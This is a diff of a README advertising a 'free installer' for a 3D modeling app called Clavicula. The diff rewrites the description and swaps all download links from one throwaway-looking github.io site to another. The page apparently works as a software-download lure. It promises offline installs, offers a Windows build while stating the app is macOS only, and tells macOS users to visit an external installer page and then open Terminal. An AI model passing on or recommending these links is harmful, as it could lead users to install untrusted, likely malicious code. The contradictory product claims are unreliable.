@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-3D+Modeling-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Clavicula Free Installer** — Clavicula is a 3D modeling and sculpting application that offers a streamlined workflow for creating hard-surface models and organic shapes. Works without internet access, no account required. Full offline installation.
+**💻 Clavicula Free Installer** — Clavicula is a macOS 3D modeling application focused on hard-surface and organic modeling with a node-based procedural workflow. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Clavicula](https://img.shields.io/badge/⬇_Install_Clavicula-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Clavicula](https://img.shields.io/badge/⬇_Install_Clavicula-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Clavicula
 
-Clavicula is a 3D modeling and sculpting application that offers a streamlined workflow for creating hard-surface models and organic shapes. With a focus on procedural modeling tools, real-time preview, and an artist-friendly interface, Clavicula aims to make complex 3D modeling more accessible. It supports export to industry-standard formats for use in rendering and game engine pipelines.
+Clavicula is a macOS 3D modeling application focused on hard-surface and organic modeling with a node-based procedural workflow. It provides a unique modeling paradigm that allows non-destructive editing of complex 3D shapes.
 
 ---
 
 ## ❌ Problem: Clavicula is hard to access
 
-- **Newer Software** — Smaller community with fewer tutorials than established tools
-- **Feature Completeness** — Some workflows less mature than industry-standard alternatives
-- **Platform Availability** — Limited platform support compared to major 3D applications
-- **Integration** — Workflow integration with major 3D suites still developing
+- **macOS Only** — No Windows or Linux version available
+- **Niche Approach** — Procedural modeling paradigm unfamiliar to most 3D artists
+- **Small Community** — Limited tutorials, resources, and community support
+- **Early Development** — Feature set still maturing compared to established 3D tools
 
 ---
 
@@ -61,9 +61,9 @@ Clavicula is a 3D modeling and sculpting application that offers a streamlined w
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Clavicula is a 3D modeling and sculpting application that offers a streamlined w
 
 <div align="center">
 
-[![⬇ Install Clavicula](https://img.shields.io/badge/⬇_Install_Clavicula-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Clavicula](https://img.shields.io/badge/⬇_Install_Clavicula-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Clavicula is a 3D modeling and sculpting application that offers a streamlined w
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Clavicula is a 3D modeling and sculpting application that offers a streamlined w
 
 ---
 
-**Clavicula Free Installer** — Clavicula is a 3D modeling and sculpting application that offers a streamlined workflow for creating hard-surface models and organic shapes. Install without internet connection today!
+**Clavicula Free Installer** — Clavicula is a macOS 3D modeling application focused on hard-surface and organic modeling with a node-based procedural workflow. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Clavicula](https://img.shields.io/badge/⬇_Install_Clavicula-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Clavicula](https://img.shields.io/badge/⬇_Install_Clavicula-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
